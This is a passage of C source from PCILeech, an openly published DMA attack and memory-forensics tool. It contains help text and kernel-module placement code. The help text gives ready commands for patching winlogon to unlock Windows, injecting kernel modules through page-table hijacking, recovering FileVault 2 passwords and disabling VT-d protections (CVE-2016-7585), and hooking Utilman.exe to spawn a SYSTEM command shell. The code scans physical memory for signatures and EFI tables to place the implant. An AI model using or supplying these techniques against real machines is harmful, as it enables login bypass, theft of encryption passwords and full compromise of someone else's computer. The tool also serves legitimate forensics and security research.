            " The DUMP command dumps 4kB memory pages. Partial pages are not supported.     \n" \
            " EXAMPLES:      (example kernel module is loaded at address 0x7fffe000)        \n" \
            " 1) dump memory up to 4GB by using NATIVE mode:                                \n" \
            "    pcileech dump                                                              \n" \
            " 2) dump memory as seen by the kernel using kernel module:                     \n" \
            "    pcileech dump -kmd 0x7fffe000                                              \n" \
            " 3) dump memory between 5GB and 6GB:                                           \n" \
            "    pcileech dump -min 0x140000000 -max 0x180000000                            \n" \
            " 4) dump memory to file c:\\temp\\out.raw:                                     \n" \
            "    pcileech dump -kmd 0x7fffe000 -out \"c:\\temp\\out.raw\"                   \n" \
            " 5) dump memory from remote LeechService using DumpIt:                         \n" \
            "    pcileech dump -device dumpit -remote rpc://userspn@ad.domain.com -out 1.dmp\n" \
        );
        break;
    case WRITE:
        printf(
            " WRITE DATA TO TARGET SYSTEM MEMORY.                                           \n" \
            " MODES   : NATIVE, KMD                                                         \n" \
            " OPTIONS : -min, -in, -force, -pid, -vamin, -vamax                             \n" \
            " WRITE will write contents specified in the -in option to the memory address   \n" \
            " specified by the -min option. The memory address may be unaligned. It is also \n" \
            " possible to try to write to non-accessible memory - such as PCIe memory mapped\n" \
            " devices with the -force option. Please note that using the -force option may  \n" \
            " result in a system crash. In KMD mode the write is performed by the target    \n" \
            " operating system. In NATIVE mode the write is performed by the PCILeech device\n" \
            " EXAMPLES:      (example kernel module is loaded at address 0x7fffe000)        \n" \
            " 1) write the bytes 11223344 to the physical address 0x1003                    \n" \
            "    pcileech write -min 0x1003 -in 11223344                                    \n" \
            " 2) write contents in the file replace.bin to the address 0x140000000          \n" \
            "    pcileech write -min 0x140000000 -in replace.bin -kmd 0x7fffe000            \n" \
            " 3) write the bytes 11223344 to the protected address 0xfffe0008               \n" \
            "    pcileech write -min 0xfffe0008 -in 11223344 -force                         \n" \
            " 4) write the bytes 33445566 to the virtual address 7fef9c00000 (pid 1240)     \n" \
            "    pcileech write -pid 1240 -vamin 7fef9c00000 -in 33445566                   \n");
        break;
    case PATCH:
        printf(
            " PATCH THE MEMORY OF THE TARGET SYSTEM.                                        \n" \
            " MODES   : NATIVE, KMD                                                         \n" \
            " OPTIONS : -min, -max, -sig, -all, -force, -pid, -vamin, -vamax                \n" \
            " Patch loads one or several signatures from the .sig file specified in the -sig\n" \
            " option. The -sig option should be specified without file extension. The memory\n" \
            " is scanned until the first signature match is made. The memory is then patched\n" \
            " with new contents according to the loaded signature. After a match has been   \n" \
            " made PCILeech exits. If all available memory should be searched for signatures\n" \
            " please supply the -all option. The options -min and -max may also optionally  \n" \
            " be given to limit the memory space searched. Patching is performed per 4096   \n" \
            " byte page. Signatures spanning multiple pages are unsupported.                \n" \
            " EXAMPLES:      (example kernel module is loaded at address 0x7fffe000)        \n" \
            " 1) try patch the memory with the unlock_win10x64 signature (kmd not loaded)   \n" \
            "    pcileech patch -sig unlock_win10x64                                        \n" \
            " 2) patch the memory with the unlock_win10x64 signature (kmd loaded)           \n" \
            "    pcileech patch -sig unlock_win10x64 -kmd 0x7fffe000                        \n" \
            " 3) patch the memory with the unlock_win10x64 targeting pid 344 (winlogon.exe) \n" \
            "    pcileech patch -sig unlock_win10x64 -pid 344                               \n" \
            " 4) patch all occurences with the patch_test signature                         \n" \
            "    pcileech patch -sig patch_test -kmd 0x7fffe000 -all                        \n");
        break;
    case SEARCH:
        printf(
            " SEARCH THE MEMORY OF THE TARGET SYSTEM FOR THE GIVEN SIGNATURE.               \n" \
            " MODES   : NATIVE, KMD                                                         \n" \
            " OPTIONS : -min, -max, -sig, -in, -all, -force, -pid, -vamin, -vamax           \n" \
            " Search the memory for signatures specified in the -sig or -in options. If the \n" \
            " -sig option is specified signatures are loaded from the signature file and are\n" \
            " search for at their fixed page offsets. If the signature is specified with the\n" \
            " -in option the whole memory at all page offsets is searched. The memory ranges\n" \
            " searched can be limited by supplying optional -min and -max options. It is    \n" \
            " also possible to search restricted memory by supplying the -force option. When\n" \
            " a signature is found the search is stopped unless the -all option is given.   \n" \
            " Searching is performed per 4096 byte page. Signatures spanning multiple pages \n" \
            " are unsupported.                                                              \n" \
            " EXAMPLES:      (example kernel module is loaded at address 0x7fffe000)        \n" \
            " 1) search for the first location that matches the unlock_win10x64 signature.  \n" \
            "    pcileech search -sig unlock_win10x64                                       \n" \
            " 2) search for all locations that matches the unlock_win10x64 signature.       \n" \
            "    pcileech search -sig unlock_win10x64 -all                                  \n" \
            " 3) search for all unlock_win10x64 locations by using a kernel module.         \n" \
            "    pcileech search -sig unlock_win10x64 -all -kmd 0x7fffe000                  \n" \
            " 4) search for all unlock_win10x64 targeting pid 344 (winlogon.exe)            \n" \
            "    pcileech search -sig unlock_win10x64 -all -pid 344                         \n" \
            " 5) search for all locations that contain the pattern 444d4152.                \n" \
            "    pcileech search -in 444d4152 -all -kmd 0x7fffe000                          \n" \
            " 6) search for the first location containing the pattern in the file pat.bin.  \n" \
            "    pcileech search -in pat.bin -all -kmd 0x7fffe000                           \n");
        break;
    case MOUNT:
        printf(
            " MOUNT TARGET LIVE RAM AND FILE SYSTEM AS 'NETWORK DRIVE'.                     \n" \
            " MODES   : KMD                                                                 \n" \
            " REQUIRE : Windows/Dokany or Linux/FUSE                                        \n" \
            " OPTIONS : -mount                                                              \n" \
            " Mount the target system live ram and file system as the drive letter specified\n" \
            " in the -mount option.  If the -mount option is not specified PCILeech will try\n" \
            " to mount the target file system as the K: drive letter.                       \n" \
            " File system comes with two main functionalities, mount target system files if \n" \
            " hardware device is used, and mount memory process file system (in read-only   \n" \
            " mode when dump file is used, in read-write mode when hardware device is used).\n" \
            " ------------------------------------------------------------------------------\n" \
            " File system mount is currently supported for: macOS, Windows and Linux.  There\n" \
            " are limitations that are important to know, please see below. Use at own risk!\n" \
            "  - Create file: not implemented.                                              \n" \
            "  - Write to files may be buggy and may in rare cases corrupt the target file. \n" \
            "  - Delete file will most often work, but with errors.                         \n" \
            "  - Delete directory, rename/move file and other features may not be supported.\n" \
            "  - Only the C:\\ drive is mounted on Windows target systems.                  \n" \
            " The target system files are found in the files directory.    The memory of the\n" \
            " target system is mapped into the files: liveram-kmd.raw and liveram-native.raw\n" \
            " Writing to the live memory may crash the target system.      Copying files and\n" \
            " dumping memory via the PCILeech virtual file system will work but  performance\n" \
            " will be better when using the built in commandline commands.                  \n" \
            " - Mount it only supported only when running PCILeech on Windows.              \n" \
            " - Mount of live RAM without kernel module is only supported on FPGA hardware. \n" \
            " EXAMPLES:      (example kernel module is loaded at address 0x7fffe000)        \n" \
            " 1) Mount file system and live RAM of target as the default K: drive letter.   \n" \
            "    pcileech mount -kmd 0x7fffe000                                             \n" \
            " 2) Mount file system and live RAM of target as X: drive letter.               \n" \
            "    pcileech mount -kmd 0x7fffe000 -mount X                                    \n" \
            " 3) Mount live ram and proc file system only using FPGA hardware.              \n" \
            "    pcileech mount -max 0x21e5fffff                                            \n" \
            " 4) Mount live ram and 'proc' file system by specifying a specific CR3/PML4.   \n" \
            "    prileech mount -cr3 0x1ab000                                               \n" \
        );
        break;
    case DISPLAY:
        printf(
            " DISPLAY MEMORY ON SCREEN.                                                     \n" \
            " MODES   : NATIVE, KMD                                                         \n" \
            " OPTIONS : -min, -max (optional), -pid, -vamin, -vamax                         \n" \
            " The memory contents between min and max is shown on screen.                   \n" \
            " Use the -min option to specify the memory location.                           \n" \
            " EXAMPLES:      (example kernel module is loaded at address 0x7fffe000)        \n" \
            " 1) display memory starting at physical address 0x1000.                        \n" \
            "    pcileech display -min 0x1000                                               \n" \
            " 2) display memory between 0x1000 and 0x2fff.                                  \n" \
            "    pcileech display -min 0x1000 -max 0x2fff                                   \n" \
            " 3) display memory starting at physical address 0x140000000 (5GB).             \n" \
            "    pcileech display -min 0x140000000 -kmd 0x7fffe000                          \n" \
            " 4) display memory starting at virtual address 0x7fefd360000 in pid 1240       \n" \
            "    pcileech display -pid 1240 -vamin 0x7fefd360000                            \n");
        break;
    case PAGEDISPLAY:
        printf(
            " DISPLAY A MEMORY PAGE ON SCREEN.                                              \n" \
            " MODES   : NATIVE, KMD                                                         \n" \
            " OPTIONS : -min, -pid, -vamin, -vamax                                          \n" \
            " The memory contents of a single page (4096 bytes) is shown on screen. Use the \n" \
            " -min option to specify the memory location. If the -min option is not aligned \n" \
            " the specified memory address will be truncated. It is also possible to force  \n" \
            " reading of otherwise inaccessible memory with the -force option.              \n" \
            " EXAMPLES:      (example kernel module is loaded at address 0x7fffe000)        \n" \
            " 1) display the page starting at physical address 0x1000.                      \n" \
            "    pcileech pagedisplay -min 0x1000                                           \n" \
            " 2) display the normally restricted page at physical address 0xf0000.          \n" \
            "    pcileech pagedisplay -min 0xf0000 -force                                   \n" \
            " 3) display the page at address 0x140000000 (5GB).                             \n" \
            "    pcileech pagedisplay -min 0x140000000 -kmd 0x7fffe000                      \n" \
            " 4) display the page at virtual address 0x7fefd360000 in pid 1240              \n" \
            "    pcileech pagedisplay -pid 1240 -vamin 0x7fefd360000                        \n");
        break;
    case TESTMEMREAD:
    case TESTMEMREADWRITE:
        printf(
            " TEST READING AND/OR READING+WRITING TO A PHYSICAL MEMORY ADDRESS.             \n" \
            " MODES   : NATIVE                                                                 \n" \
            " Used for debug purposes. Test reading and/or reading+writing to a physical    \n" \
            " memory address. The address page read and optionally written to is specified  \n" \
            " by the -min option. If the address is inside a protected range then the -force\n" \
            " option could be specified to override. A number of reads and writes are exec- \n" \
            " cuted. Unless there is a catastrophic failure the page is restored to its     \n" \
            " original state after testing writes with testmemreadwrite.                    \n" \
            " EXAMPLES:                                                                     \n" \
            " 1) test reading from the memory address at 0x1000                             \n" \
            "    pcileech testmemread -min 0x1000                                           \n" \
            " 1) test reading from the normally protected address 0xf4000000                \n" \
            "    pcileech testmemread -min 0xf4000000 -force                                \n" \
            " 2) test reading and writing to/from the memory address 0x1000                 \n" \
            "    pcileech testmemreadwrite -min 0x1000                                      \n");
        break;
    case KMDLOAD:
        printf(
            " LOAD A KERNEL MODULE INTO THE OPERATING SYSTEM KERNEL FOR LATER USE.          \n" \
            " MODES   : NATIVE                                                                 \n" \
            " OPTIONS : -kmd, -pt, -cr3                                                     \n" \
            " Load a kernel module into the running operating system kernel for later use.  \n" \
            " The kernel module is specified in the -kmd paramter. If the specified kernel  \n" \
            " module is generic and memory searches are supported it will be searched for   \n" \
            " in memory. Specialized windows 10 kernel module are loaded by hi-jacking the  \n" \
            " page table. The page table is searched for automatically with the -pt option. \n" \
            " The page table base may also optionally be specified in the -cr3 option.      \n" \
            " EXAMPLES:                                                                     \n" \
            " 1) load a kernel module into Windows Vista by specifying a generic signature. \n" \
            "    pcileech kmdload -kmd winvistax64                                          \n" \
            " 2) load a kernel module into Linux by specifying a generic signature.         \n" \
            "    pcileech kmdload -kmd LINUX_X64                                            \n" \
            " 3) load a kernel module into Windows 10 by targeting a specific driver.       \n" \
            "    pcileech kmdload -kmd win10x64_ntfs_20160716 -pt                           \n");
        break;
    case KMDEXIT:
        printf(
            " UNLOAD AN ACTIVE KERNEL MODULE FROM THE TARGET SYSTEM.                        \n" \
            " MODES   : KMD                                                                 \n" \
            " OPTIONS :                                                                     \n" \
            " Unload an active kernel module from the target system. The already active     \n" \
            " kernel module is asked to terminate and clean up itself as best as possible.  \n" \
            " After running the kmdexit command it will not be possible to access the       \n" \
            " kernel module any more.                                                       \n" \
            " EXAMPLES:      (example kernel module is loaded at address 0x7fffe000)        \n" \
            " 1) unload the already loaded kernel module.                                   \n" \
            "    pcileech kmdexit -kmd 0x7fffe000                                           \n");
        break;
    case MAC_FVRECOVER:
        printf(
            " RECOVER FILEVAULT 2 PASSWORD FROM A LOCKED macOS SYSTEM.                      \n" \
            " MODES   : NATIVE                                                              \n" \
            " OPTIONS :                                                                     \n" \
            " Plug in the PCILeech device to any macOS system with a Thunderbolt 2 port. You\n" \
            " will be asked to reboot if PCILeech is ready. After the reboot PCILeech will  \n" \
            " try to figure out the filevault 2 full disk encryption password used to unlock\n" \
            " the disk crypto. This issue has been patched in macOS Sierra 10.12.2.         \n" \
            " A small memory dump will also be written to disk. In case PCILeech is uable to\n" \
            " automatically figure out the password this memory dump may be used. In order  \n" \
            " for PCILeech to figure out the password only ascii characters may be used; if \n" \
            " other unicode characters exist in the password PCILeech will not be able to   \n" \
            " automatically recover the password. (CVE-2016-7585).                          \n" \
            " EXAMPLES:                                                                     \n" \
            " 1) recover the filevault 2 disk encryption password.                          \n" \
            "    pcileech mac_fvrecover                                                     \n");
        break;
    case MAC_FVRECOVER2:
        printf(
            " RECOVER FILEVAULT 2 PASSWORD FROM A macOS SYSTEM IMMEDIATELY AFTER UNLOCK.    \n" \
            " MODES   : NATIVE                                                                 \n" \
            " OPTIONS :                                                                     \n" \
            " Plug in the PCILeech device to any macOS system with a Thunderbolt 2 port.    \n" \
            " Wait for the user to enter the filefault 2 password to unlock the computer.   \n" \
            " Immediately after unlock VT-d DMA protections are dropped for a short while   \n" \
            " and the password can be recovered in a similar way to the MAV_FVRECOVER       \n" \
            " command. (CVE-2016-7585).                                                     \n" \
            " EXAMPLES:                                                                     \n" \
            " 1) recover the filevault 2 disk encryption password immediately after unlock. \n" \
            "    pcileech mac_fvrecover2                                                    \n");
        break;
    case MAC_DISABLE_VTD:
        printf(
            " DISABLE Vt-d DMA PROTECTIONS IMMEDIATELY AFTER macOS BOOT.                    \n" \
            " MODES   : NATIVE                                                              \n" \
            " OPTIONS :                                                                     \n" \
            " Plug in the PCILeech device to any macOS system with a Thunderbolt 2 port.    \n" \
            " Wait for the user to enter the filefault 2 password to unlock the computer.   \n" \
            " Immediately after unlock VT-d DMA protections are dropped for a short while   \n" \
            " and it is possible to disable the in-memory DMAR ACPI table - which results   \n" \
            " in completely disabled VT-d protections until the computer is rebooted.       \n" \
            " (CVE-2016-7585).                                                              \n" \
            " EXAMPLES:                                                                     \n" \
            " 1) disable Vt-d DMA protections immediately after macOS boot.                 \n" \
            "    pcileech mac_disablevtd                                                    \n");
        break;
    case PT_PHYS2VIRT:
        printf(
            " SEARCH FOR VIRTUAL ADDRESS MAPPED TO GIVEN PHYSICAL ADDRESS.                  \n" \
            " MODES   : NATIVE, KMD                                                         \n" \
            " OPTIONS : -cr3, -0                                                            \n" \
            " Walk the page table of which base is specified on the 'cr3' option to find the\n" \
            " first occurrence of a virtual address mapped to the physical address specified\n" \
            " in the '0' option. If an entry is found the virtual address and the PTE will  \n" \
            " be displayed. Only the first occurrence will be displayed.                    \n" \
            " EXAMPLEs:                                                                     \n" \
            " 1) search for virtual address mapped to physical 0xfed90000 given a page table\n" \
            "    (PML4) base at: 0x1aa000.                                                  \n" \
            "    pcileech pt_phys2virt -cr3 0x1aa000 -0 0xfed90000                          \n");
        break;
    case PT_VIRT2PHYS:
        printf(
            " RETRIEVE PHYSICAL ADDRESS THAT VIRTUAL ADDRESS RESOLVES TO.                   \n" \
            " MODES   : NATIVE, KMD                                                         \n" \
            " OPTIONS : -cr3, -0                                                            \n" \
            " Retrieve the physical address that the virtual address resolves to.  The Phys-\n" \
            " ical address of the CR3 register is specified in '-cr3' parameter. The virtual\n" \
            " address is specified in the '-0' option.                                      \n" \
            " EXAMPLEs:                                                                     \n" \
            " 1) search for physical address mapped by virtual 0xfffff80000fed000.          \n" \
            "    (PML4) base at: 0x1aa000.                                                  \n" \
            "    pcileech pt_virt2phys -cr3 0x1aa000 -0 0xfffff80000fed000                  \n");
        break;
    case TLP:
        printf(
            " TRANSMIT AND RECEIVE RAW PCIe TLPs                                            \n" \
            " MODES   : NATIVE                                                              \n" \
            " OPTIONS : -in, -vv, -wait                                                     \n" \
            " Transmit and receive PCIe TLPs. Requires supported devices such as the SP605. \n" \
            " The USB3380 is not a supported device. Multiple TLPs may be stacked. If not   \n" \
            " specifying an -in parameter no TLP will be sent. Specify the -vv setting to   \n" \
            " display received and sent TLPs. The default listen time is 0.5s, if a longer  \n" \
            " listen time is required specify it with the -wait parameter.                  \n" \
            " Supported only when running PCILeech on Windows.                              \n" \
            " EXAMPLEs:                                                                     \n" \
            " 1) Listen for incoming TLPs for 10s:                                          \n" \
            "    pcileech -vv -wait 10                                                      \n");
        break;
    case PROBE:
        printf(
            " PROBE MEMORY FOR READABLE PAGES                                               \n" \
            " MODES   : NATIVE                                                              \n" \
            " Probe a memory region specified by defaults or -min, -max for readable pages. \n" \
            " This is done in a device-effifient manner. Probing is performed in NATIVE mode\n" \
            " The USB3380 is not a supported device.                                        \n" \
            " EXAMPLEs:                                                                     \n" \
            " 1) Probe memory up to 10GB                                                    \n" \
            "    pcileech probe -max 0x280000000                                            \n");
        break;
    case REGCFG:
        printf(
            " READ OR WRITE TO FPGA PCIe SHADOW CONFIGURATION SPACE                         \n" \
            " MODES   : NATIVE                                                              \n" \
            " OPTIONS : -in -out -min -max                                                  \n" \
            " A write is triggered by specifying the data to write as a hexascii string on  \n" \
            " the -in parameter as well as the start address with the -min parameter.       \n" \
            " A read is assumed unless write. The whole config space will be read.          \n" \
            " It is possible to adjust on-screen output with parameters: -min and -max.     \n" \
            " NB! The FPGA connect string: -device fpga://pcienotconnected=1                \n" \
            " EXAMPLEs:                                                                     \n" \
            " 1) WRITE 3 bytes starting at address: 0x231                                   \n" \
            "    pcileech regcfg -min 0x201 -in c0fefe                                      \n" \
            " 2) READ and only display 0x200-0x23f on-screen                                \n" \
            "    pcileech regcfg -min 0x200 -max 0x23f                                      \n" \
            " 2) READ to output file:                                                       \n" \
            "    pcileech regcfg -out outputfile.bin                                        \n");
        break;
    case PSLIST:
        printf(
            " LIST PROCESSES OF THE TARGET SYSTEM                                           \n" \
            " MODES   : NATIVE                                                              \n" \
            " OPTIONS :                                                                     \n" \
            " List the process names and pids of the targeted Windows system.               \n" \
            " EXAMPLEs:                                                                     \n" \
            " 1) List devices using 'fpga' or 'usb3380' hardware device.                    \n" \
            "    pcileech pslist                                                            \n" \
            " 2) List devices in dump file win10.raw                                        \n" \
            "    pcileech pslist -device win10.raw                                          \n");
        break;
    case PSVIRT2PHYS:
        printf(
            " TRANSLATE A VIRTUAL MEMORY ADDRESS INTO PHYSICAL MEMORY ADDRESS FOR GIVEN PID \n" \
            " MODES   : NATIVE                                                              \n" \
            " OPTIONS : -0, -1                                                              \n" \
            " Translate a Windows process virtual address into a physical address           \n" \
            " EXAMPLEs:                                                                     \n" \
            " 1) Translate a virtual address of pid 638 into its physical address           \n" \
            "    pcileech psvirt2phys -0 638 -1 0x7ffc8b41a000                              \n");
        break;
    case EXEC_UMD:
        printf(
            " EXECUTE A USER MODE SHELLCODE (EXPERIMENTAL)                                  \n" \
            " MODES   : NATIVE                                                              \n" \
            " OPTIONS : -0, -1 -hook -s                                                     \n" \
            " Hook a user mode application (currently supported method is hooking the import\n" \
            " address table - IAT). If the hook is successful the shellcode will be executed\n" \
            " (currently supported is creating a new process.                               \n" \
            " pcileech UMD_WINX64_IAT_PSEXEC -0 <pid> -1 <flags> -s <exe> -hook <hook-iat>  \n" \
            " EXAMPLEs:                                                                     \n" \
            " 1) Create a CMD from Utilman.exe by hooking RegCloseKey (632 is the pid):     \n" \
            "    pcileech UMD_WINX64_IAT_PSEXEC -hook ADVAPI32.dll!RegCloseKey              \n" \
            "             -0 632 -1 0x08000000 -s c:\\windows\\system32\\cmd.exe            \n" \
        );
        break;
    case AGENT_EXEC_PY:
        printf(
            " EXECUTE A PYTHON SCRIPT ON A REMOTE HOST RUNNING LeechAgent                   \n" \
            " MODES   : NATIVE                                                              \n" \
            " REQUIRE : Windows/Remote LeechAgent                                           \n" \
            " OPTIONS : -in, -out                                                           \n" \
            " Execute a Python script contained in the -in parameter on a remote host having\n" \
            " the LeechAgent installed.    The script will be executed in an embedded Python\n" \
            "  and the MemProcFS/LeechCore python APIs will be available and initialized.   \n" \
            " Output will be displayed on screen unless -out parameter is specified.        \n" \
            " EXAMPLE:                                                                      \n" \
            " 1) Execute the script 'myscript.py' on the remote host test1.contoso.com using\n" \
            "    physical memory acquired from WinPmem:                                     \n" \
            "    pcileech.exe agent-execpy -in myscript.py -device pmem                     \n" \
            "                 -remote rpc://test1$@contoso.com:test1.contoso.com            \n" \
        );
        break;
    case AGENT_FORENSIC:
        printf(
            " RUN MemProcFS ON REMOTE HOST RUNNING LeechAgent AND RETRIEVE RESULT           \n" \
            " MODES   : NATIVE                                                              \n" \
            " REQUIRE : Windows/Remote LeechAgent                                           \n" \
            " OPTIONS : -out                                                                \n" \
            " Start the MemProcFS memory analysis on the remote host. Results in the form of\n" \
            " ElasticSearch compatible JSON files are retrieved and saved locally. Result is\n" \
            " saved in working directory unless a _DIRECTORY_ is specified in -out parameter\n" \
            " EXAMPLE:                                                                      \n" \
            " 1) Run memory analysis on remote host using WinPmem and save result in c:\\temp\n" \
            "    pcileech.exe agent-forensic -out c:\temp -device pmem                      \n" \
            "                 -remote rpc://test1$@contoso.com:test1.contoso.com            \n" \
        );
        break;
    case EXEC_KMD:
        _HelpShowExecCommand();
        break;
    default:
        printf(
            " Detailed help for this command or implant is not available.                   \n");
        break;
    }
}

```

`pcileech/help.h`:

```h
// help.h : definitions related to displaying help texts.
//
// (c) Ulf Frisk, 2016-2022
// Author: Ulf Frisk, pcileech@frizk.net
//
#ifndef __HELP_H__
#define __HELP_H__
#include "pcileech.h"

VOID Help_ShowGeneral();
VOID Help_ShowDetailed();
VOID Help_ShowInfo();

#endif /* __HELP_H__ */

```

`pcileech/kmd.c`:

```c
// kmd.c : implementation related to operating systems kernel modules functionality.
//
// (c) Ulf Frisk, 2016-2022
// Author: Ulf Frisk, pcileech@frizk.net
//
#include "kmd.h"
#include "device.h"
#include "util.h"
#include "executor.h"
#include "vmmx.h"

typedef struct tdKMDHANDLE_S12 {
    QWORD qwPageAddr;
    DWORD dwPageOffset;
    BYTE pbOrig[4096];
    BYTE pbPatch[4096];
    BYTE pbLatest[4096];
    QWORD qwPTE;
    QWORD qwPTEOrig;
    QWORD qwPTEAddrPhys;
} KMDHANDLE_S12, *PKMDHANDLE_S12;

typedef struct tdKERNELSEEKER {
    PBYTE pbSeek;
    DWORD cbSeek;
    DWORD aSeek;
    DWORD aTableEntry;
    DWORD aFn;
    QWORD vaSeek;
    QWORD vaFn;
} KERNELSEEKER, *PKERNELSEEKER;

#define STAGE1_OFFSET_CALL_ADD          1
#define STAGE2_OFFSET_STAGE3_PHYSADDR   4
#define STAGE2_OFFSET_FN_STAGE1_ORIG    8
#define STAGE2_OFFSET_EXTRADATA1        16

_Success_(return) BOOL KMD_GetPhysicalMemoryMap();
_Success_(return) BOOL KMD_SetupStage3(_In_ DWORD dwPhysicalAddress, _In_ PBYTE pbStage3, _In_ DWORD cbStage3);

//-------------------------------------------------------------------------------
// Signature mathing below.
//-------------------------------------------------------------------------------

_Success_(return)
BOOL KMD_FindSignature2(_Inout_ PBYTE pbPages, _In_ DWORD cPages, _In_ QWORD qwAddrBase, _Inout_ PSIGNATURE pSignatures, _In_ DWORD cSignatures, _Out_ PDWORD pdwSignatureMatch)
{
    PBYTE pb;
    PSIGNATURE ps;
    QWORD pgIdx, i, j, qwAddressCurrent;
    for(pgIdx = 0; pgIdx < cPages; pgIdx++) {
        pb = pbPages + (4096 * pgIdx);
        qwAddressCurrent = qwAddrBase + (4096 * pgIdx);
        for(i = 0; i < cSignatures; i++) {
            ps = pSignatures + i;
            for(j = 0; j < 2; j++) {
                if(ps->chunk[j].qwAddress) { // already processed and found - continue
                    continue;
                }
                if((ps->chunk[j].cbOffset > 0xfff) && ((ps->chunk[j].cbOffset & ~0xfff) != qwAddressCurrent)) {
                    continue;
                }
                if(!ps->chunk[j].cb || !memcmp(pb + (ps->chunk[j].cbOffset & 0xfff), ps->chunk[j].pb, ps->chunk[j].cb)) {
                    ps->chunk[j].cb = 4096;
                    memcpy(ps->chunk[j].pb, pb, 4096);
                    ps->chunk[j].qwAddress = qwAddressCurrent;
                }
            }
            if(ps->chunk[0].qwAddress && ps->chunk[1].qwAddress) {
                *pdwSignatureMatch = (DWORD)i;
                return TRUE;
            }
        }
    }
    return FALSE;
}

_Success_(return)
BOOL KMD_FindSignature1(_Inout_ PSIGNATURE pSignatures, _In_ DWORD cSignatures, _Out_ PDWORD pdwSignatureMatchIdx)
{
    BOOL result = FALSE;
    QWORD i, qwAddrMax, qwAddrCurrent = max(0x100000, ctxMain->cfg.paAddrMin);
    PBYTE pbBuffer8M = NULL;
    PPAGE_STATISTICS pPageStat = NULL;
    // special case (fixed memory location && zero signature byte length)
    for(i = 0; i < cSignatures; i++) {
        if((pSignatures[i].chunk[0].cbOffset > 0xfff) && (pSignatures[i].chunk[0].cb == 0) && (pSignatures[i].chunk[1].cbOffset > 0xfff) && (pSignatures[i].chunk[1].cb == 0)) {
            pSignatures[i].chunk[0].qwAddress = pSignatures[i].chunk[0].cbOffset & ~0xFFF;
            pSignatures[i].chunk[1].qwAddress = pSignatures[i].chunk[1].cbOffset & ~0xFFF;
            return TRUE;
        }
    }
    // initialize / allocate memory / load signatures
    if(!(pbBuffer8M = LocalAlloc(0, 0x800000))) { goto cleanup; }
    // loop kmd-find
    qwAddrMax = min(ctxMain->cfg.paAddrMax, ctxMain->dev.paMax);
    if(!PageStatInitialize(&pPageStat, qwAddrCurrent, qwAddrMax, "Searching for KMD location", FALSE, FALSE)) { goto cleanup; }
    while(qwAddrCurrent < qwAddrMax) {
        pPageStat->qwAddr = qwAddrCurrent;
        if(DeviceReadDMA(qwAddrCurrent, 0x800000, pbBuffer8M, pPageStat)) {
            result = KMD_FindSignature2(pbBuffer8M, 2048, qwAddrCurrent, pSignatures, cSignatures, pdwSignatureMatchIdx);
            if(result) {
                pPageStat->szAction = "Waiting for KMD to activate";
                goto cleanup;
            }
        }
        qwAddrCurrent += 0x800000;
    }
cleanup:
    PageStatClose(&pPageStat);
    LocalFree(pbBuffer8M);
    return result;
}

// EFI RUNTIME SERVICES TABLE SIGNATURE (see UEFI specification (2.6) for detailed information).
#define IS_SIGNATURE_EFI_RUNTIME_SERVICES(pb) ((*(PQWORD)(pb) == 0x56524553544e5552) && (*(PDWORD)(pb + 12) == 0x88) && (*(PDWORD)(pb + 20) == 0))

_Success_(return)
BOOL KMD_FindSignature_EfiRuntimeServices(_Out_ PQWORD pqwAddrPhys)
{
    BOOL result = FALSE;
    QWORD o, qwCurrentAddress;
    PPAGE_STATISTICS pPageStat = NULL;
    PBYTE pbBuffer16M = NULL;
    if(!(pbBuffer16M = LocalAlloc(0, 0x01000000))) { goto cleanup; }
    // Option 1: User-supplied efibase option (= base of EFI RUNTIME SERVICES table (RUNTSERV)).
    if(ctxMain->cfg.paEFI_IBI_SYST) { // technically not EFI_IBI_SYST table but we use this user-supplied option anyway here.
        result =
            ((ctxMain->cfg.paEFI_IBI_SYST & 0xfff) > 0x18) &&
            ((ctxMain->cfg.paEFI_IBI_SYST & 0xfff) < (0x1000 - 0x88)) &&
            DeviceReadMEM(ctxMain->cfg.paEFI_IBI_SYST & ~0xfff, 0x1000, pbBuffer16M, TRUE) &&
            IS_SIGNATURE_EFI_RUNTIME_SERVICES(pbBuffer16M + (ctxMain->cfg.paEFI_IBI_SYST & 0xfff));
        LocalFree(pbBuffer16M);
        *pqwAddrPhys = ctxMain->cfg.paEFI_IBI_SYST;
        return result;
    }
    // Option 2: Scan for EFI RUNTIME SERVICES table (RUNTSERV).
    ctxMain->cfg.paAddrMin &= ~0xfff;
    ctxMain->cfg.paAddrMax = (ctxMain->cfg.paAddrMax + 1) & ~0xfff;
    if(ctxMain->cfg.paAddrMax == 0) {
        ctxMain->cfg.paAddrMax = 0x100000000;
    }
    qwCurrentAddress = ctxMain->cfg.paAddrMin;
    if(!PageStatInitialize(&pPageStat, ctxMain->cfg.paAddrMin, ctxMain->cfg.paAddrMax, "Searching for EFI Runtime Services", ctxMain->phKMD ? TRUE : FALSE, ctxMain->cfg.fVerbose)) { goto cleanup; }
    while(qwCurrentAddress < ctxMain->cfg.paAddrMax) {
        result = Util_Read16M(pbBuffer16M, qwCurrentAddress, pPageStat);
        if(!result && !ctxMain->cfg.fForceRW && !ctxMain->phKMD) {
            goto cleanup;
        }
        for(o = 0x18; o < 0x01000000 - 0x88; o += 8) {
            // EFI RUNTIME SERVICES TABLE SIGNATURE (see UEFI specification (2.6) for detailed information).
            // 0x30646870 == phd0 EFI memory artifact required to rule out additional false positives.
            if((*(PDWORD)(pbBuffer16M + o - 0x18) == 0x30646870) && IS_SIGNATURE_EFI_RUNTIME_SERVICES(pbBuffer16M + o)) {
                pPageStat->szAction = "Waiting for EFI Runtime Services";
                *pqwAddrPhys = qwCurrentAddress + o;
                result = TRUE;
                goto cleanup;
            }
        }
        // add to address
        qwCurrentAddress += 0x01000000;
    }
cleanup:
    PageStatClose(&pPageStat);
    LocalFree(pbBuffer16M);
    return result;
}

//-------------------------------------------------------------------------------
// macOS generic kernel seek below.
//-------------------------------------------------------------------------------

BOOL KMD_MacOSIsKernelAddress(_In_ PBYTE pbPage)
{
    DWORD i;
    if(*(PDWORD)pbPage != 0xfeedfacf) { return FALSE; } // mach_header_64 magic
    if(*(PDWORD)(pbPage + 4) != 0x01000007) { return FALSE; } // mach_header_64 cputype
    // search for kernel header data (eliminate other macho-headers)
    for(i = 0x20; i < 0xfc0; i += 8) {
        if(*(PQWORD)(pbPage + i) == 0x5450746f6F625F5F) { // __bootPT
            return TRUE;
        }
    }
    return FALSE;
}

_Success_(return)
BOOL KMD_MacOSKernelGetBase(_Out_ PDWORD pdwKernelBase, _Out_ PDWORD pdwTextHIB, _Out_ PDWORD pcbTextHIB)
{
    BYTE pbPage[4096];
    DWORD i, cKSlide;
    for(cKSlide = 1; cKSlide <= 512; cKSlide++) {
